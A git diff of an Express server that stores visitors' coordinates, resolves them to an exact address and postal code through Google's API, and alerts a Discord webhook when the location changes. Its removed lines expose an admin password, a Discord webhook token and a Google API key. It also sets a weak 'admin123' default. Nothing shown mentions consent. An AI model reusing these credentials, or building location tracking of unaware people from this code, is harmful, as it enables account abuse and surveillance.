@@ -9,11 +9,10 @@ app.use(express.static(path.join(__dirname, "public")));
 
 let lastLocation = null;
 
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "ardaxzgn27721212";   // 管理者パス
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1436327917973016770/iXMlJr33jab93ulf7ZLWEQmBVrneFYKuDVUPeg2lZh_Yp7BOJSq5Z-u3Mp_y1E4OPxx0"; // Discord通知先
-const GOOGLE_API_KEY = process.env.AIzaSyCYcTGt8jbuGTXrjJ7lGxltw-8QFGZNdak;                 // ← あなたのキー
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "";
+const GOOGLE_API_KEY = process.env.GOOGLE_API_KEY; // ← ここが正しい
 
-// --------- 正確住所 + 郵便番号取得（Google Geocoding API） ---------
 async function reverseGeocode(lat, lng) {
   const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&language=ja&key=${GOOGLE_API_KEY}`;
   const res = await fetch(url);
@@ -29,10 +28,8 @@ async function reverseGeocode(lat, lng) {
   return { address, postalCode };
 }
 
-// --------- 位置を受け取る ---------
 app.post("/save-location", async (req, res) => {
   const { latitude, longitude } = req.body;
-
   const { address, postalCode } = await reverseGeocode(latitude, longitude);
 
   const moved =
@@ -40,15 +37,8 @@ app.post("/save-location", async (req, res) => {
     lastLocation.latitude !== latitude ||
     lastLocation.longitude !== longitude;
 
-  lastLocation = {
-    latitude,
-    longitude,
-    address,
-    postalCode,
-    time: new Date().toLocaleString()
-  };
+  lastLocation = { latitude, longitude, address, postalCode, time: new Date().toLocaleString() };
 
-  // ---------- 位置が変わったら Discord 通知 ----------
   if (moved && DISCORD_WEBHOOK_URL) {
     await fetch(DISCORD_WEBHOOK_URL, {
       method: "POST",
@@ -65,13 +55,11 @@ ${address}
   res.send("位置情報を保存しました");
 });
 
-// --------- 管理画面が位置を見る ---------
 app.post("/admin/location", (req, res) => {
   const { password } = req.body;
   if (password !== ADMIN_PASSWORD) return res.status(401).json({ error: "認証失敗" });
   res.json(lastLocation || { message: "データなし" });
 });
 
-// --------- サーバー起動 ---------
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`✅ 正確住所版 Server 起動 → PORT: ${PORT}`));
